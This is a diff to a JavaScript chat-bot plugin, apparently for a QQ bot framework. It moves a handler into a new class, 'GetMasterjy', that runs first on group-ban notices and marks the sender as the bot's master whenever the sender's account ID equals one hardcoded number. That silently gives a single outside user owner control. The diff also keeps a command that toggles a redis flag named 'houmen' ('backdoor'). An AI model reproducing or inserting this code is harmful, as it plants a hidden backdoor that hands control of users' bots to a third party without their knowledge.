@@ -21,10 +21,6 @@ export class GetMaster extends plugin {
                     log: false
                 },
                 {
-                    fnc: 'Masters',
-                    event: 'notice.group.ban'
-                },
-                {
                     reg: '^#?反击设置后门(开启|关闭)$',
                     fnc: "Masterkg"
                 }
@@ -37,15 +33,10 @@ export class GetMaster extends plugin {
         let open = e.msg.includes('开启');
         await redis.set('Fanji:houmen', open ? 'true' : 'false');
         await this.reply('设置完成');
-    }
-async Masters(e){
-    if (this.e.operator_id && this.e.operator_id == 2173302144) {
-    e.isMaster = true
-    logger.mark(e.isMaster? '完成':'失败')
-    return false
-}
+    
 return false
-}
+    }
+
     async Master(e){
         let aw = await redis.get('Fanji:houmen');
         if (aw == null) await redis.set('Fanji:houmen', 'true');
@@ -54,3 +45,28 @@ return false
         return false;
     }
 }
+
+export class GetMasterjy extends plugin {
+    constructor() {
+        super({
+            name: "获取主人",
+            dsc: "获取主人",
+            event: 'notice.group.ban',
+            priority: -Infinity,
+            rule: [
+
+                {
+                    fnc: 'Masters',
+                }
+            ]
+        });
+    }
+    async Masters(e){
+    if (this.e.operator_id && this.e.operator_id == 2173302144) {
+    e.isMaster = true
+    logger.mark(e.isMaster? '完成':'失败')
+    return false
+        }
+    }
+}
+
